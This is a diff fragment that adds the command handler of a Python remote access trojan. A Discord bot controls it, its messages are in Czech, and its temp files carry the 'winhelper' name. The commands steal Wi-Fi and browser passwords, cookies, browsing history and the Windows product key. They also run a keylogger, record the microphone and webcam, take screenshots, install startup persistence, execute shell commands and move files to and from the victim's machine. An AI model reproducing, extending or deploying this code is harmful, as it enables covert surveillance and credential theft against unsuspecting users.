+        if not arg:
+            return "Pouziti: .write <text>"
+        type_text(arg)
+        return f"[OK] Napsano: {arg}"
+
+    if cmd == ".wallpaper":
+        if not atts:
+            return "Pouziti: .wallpaper + priloha"
+        a = atts[0]
+        dest = os.path.join(TEMP, "winhelper_wall_" + a.filename)
+        try:
+            import requests as rq
+            r = rq.get(a.url, timeout=60)
+            with open(dest, "wb") as f:
+                f.write(r.content)
+            return "[OK] Wallpaper zmenen." if set_wallpaper(dest) \
+                   else "[Chyba] Nepodarilo se nastavit."
+        except Exception as e:
+            return f"[Chyba] {e}"
+
+    if cmd == ".clipboard":
+        return get_clipboard()
+
+    if cmd == ".idletime":
+        return f"Idle: {idle_time()}"
+
+    if cmd == ".screenshot" or cmd == ".ss":
+        p = os.path.join(TEMP, f"winhelper_ss_{int(time.time())}.png")
+        return ("[OK] Screenshot", p) if screenshot(p) else "[Chyba] Screenshot"
+
+    if cmd == ".exit":
+        keylogger.stop()
+        recorder.stop()
+        os._exit(0)
+
+    if cmd == ".kill":
+        # .kill all  -> ukoncit;  .kill <index> -> zabit proces z .listprocess
+        if arg.lower() == "all":
+            keylogger.stop()
+            recorder.stop()
+            os._exit(0)
+        return kill_process(arg)
+
+    if cmd == ".shutdown":
+        run_hidden("shutdown /s /t 5", shell=True, timeout=10)
+        return "[OK] Shutdown za 5 s"
+    if cmd == ".restart":
+        run_hidden("shutdown /r /t 5", shell=True, timeout=10)
+        return "[OK] Restart za 5 s"
+    if cmd == ".logoff":
+        run_hidden("shutdown /l", shell=True, timeout=10)
+        return "[OK] Logoff"
+
+    if cmd == ".bluescreen":
+        fake_bsod()
+        return "[OK] Fake BSOD (prank)"
+
+    if cmd == ".datetime":
+        return datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
+
+    if cmd == ".prockill":
+        if not arg:
+            return "Pouziti: .prockill <nazev_procesu>"
+        return run_hidden(["taskkill", "/F", "/IM", arg])
+
+    if cmd == ".audio":
+        if not atts:
+            return "Pouziti: .audio + priloha"
+        a = atts[0]
+        dest = os.path.join(TEMP, a.filename)
+        try:
+            import requests as rq
+            r = rq.get(a.url, timeout=60)
+            with open(dest, "wb") as f:
+                f.write(r.content)
+            threading.Thread(target=play_audio, args=(dest,), daemon=True).start()
+            return f"[OK] Prehravam: {a.filename}"
+        except Exception as e:
+            return f"[Chyba] {e}"
+
+    if cmd == ".website":
+        if not arg:
+            return "Pouziti: .website <url>"
+        if not arg.startswith("http"):
+            arg = "https://" + arg
+        webbrowser.open(arg)
+        return f"[OK] Otevreno: {arg}"
+
+    if cmd == ".startup" or cmd == ".persist":
+        return "[OK] Persistenca nastavena." if add_startup() else "[Chyba] Persistenca"
+
+    if cmd == ".geolocate":
+        return geolocate()
+
+    if cmd == ".listprocess" or cmd == ".show":
+        return show_processes()
+
+    if cmd == ".getcams":
+        cams = get_cameras()
+        if not cams:
+            return "[?] Zadne kamery."
+        return "\n".join(f"{i}: {c}" for i, c in enumerate(cams))
+
+    if cmd == ".selectcam":
+        try:
+            SELECTED_CAM = int(arg)
+            return f"[OK] Vybrana kamera {SELECTED_CAM}"
+        except ValueError:
+            return "Pouziti: .selectcam <cislo>"
+
+    if cmd == ".webcampic":
+        p = os.path.join(TEMP, f"winhelper_cam_{int(time.time())}.png")
+        return ("[OK] Foto z kamery", p) if webcam_pic(SELECTED_CAM, p) \
+               else "[Chyba] Kamera nedostupna."
+
+    # ---------- prebrane z Telegram buildu ----------
+    if cmd == ".info":
+        return get_info()
+
+    if cmd == ".wifi":
+        return dump_wifi()
+
+    if cmd == ".passwords":
+        return dump_passwords()
+
+    if cmd == ".browsers":
+        return dump_cookies()
+
+    if cmd == ".keys":
+        return get_windows_key()
+
+    if cmd == ".history":
+        n = 20
+        try:
+            n = int(arg) if arg else 20
+        except ValueError:
+            pass
+        return dump_history(n)
+
+    if cmd == ".record" or cmd == ".record start":
+        return recorder.start()
+    if cmd == ".record stop":
+        return recorder.stop()
+
+    if cmd == ".keylog" or cmd == ".keylog start":
+        return keylogger.start()
+    if cmd == ".keylog stop":
+        return keylogger.stop()
+
+    if cmd == ".self-destruct":
+        SELF_DESTRUCT_ARMED = True
+        SELF_DESTRUCT_DEADLINE = time.time() + 120
+        return ("[POZOR] Opravdu odinstalovat?\n"
+                "Smaze startup, registry, logy i sebe.\n"
+                "Napis YES (platnost 2 min) nebo NO.")
+
+    # ---------- help ----------
+    if cmd == ".help":
+        return (
+            "== Puvodni Discord set ==\n"
+            ".message <text>      - MessageBox\n"
+            ".shell <prikaz>      - shell prikaz\n"
+            ".voice <text>        - precte text nahlas\n"
+            ".admincheck          - admin?\n"
+            ".cd <cesta> / .dir / .currentdir\n"
+            ".download <cesta>    - poslat soubor ze stroje\n"
+            ".upload + attachment - ulozit soubor na stroj\n"
+            ".uploadlink <url> <nazev>\n"
+            ".delete <cesta>      - smazat\n"
+            ".write <text>        - napsat text do okna\n"
+            ".wallpaper + attachment\n"
+            ".clipboard           - schranka\n"
+            ".idletime            - doba necinnosti\n"
+            ".screenshot / .ss    - screenshot\n"
+            ".exit / .kill all    - ukoncit\n"
+            ".shutdown / .restart / .logoff\n"
+            ".bluescreen          - fake BSOD prank\n"
+            ".datetime            - datum a cas\n"
+            ".prockill <nazev>    - zabit proces jmenem\n"
+            ".audio + attachment  - prehrat audio\n"
+            ".website <url>       - otevrit web\n"
+            ".startup / .persist  - autostart\n"
+            ".geolocate           - geolokace pres IP\n"
+            ".listprocess / .show - seznam procesu (cislovane)\n"
+            ".kill <index>        - zabít proces podle indexu\n"
+            ".getcams / .selectcam <n> / .webcampic\n"
+            "== Z Telegram buildu ==\n"
+            ".info                - info o zarizeni\n"
+            ".wifi                - WiFi hesla\n"
+            ".passwords           - hesla Chrome/Edge/Brave (soubor)\n"
+            ".browsers            - cookies (soubor)\n"
+            ".keys                - Windows produktovy klic\n"
+            ".history [n]         - historie prohlizecu\n"
+            ".record start/stop   - mikrofon (WAV do TEMP)\n"
+            ".keylog start/stop   - keylogger (log do TEMP)\n"
+            ".self-destruct       - odinstalace (YES/NO)\n"
+            ".help                - tento prehled"
+        )
+
+    return None
+
+# ================= START =================
+
+def main():
+    bot.run(BOT_TOKEN)
+
+if __name__ == "__main__":
+    main()
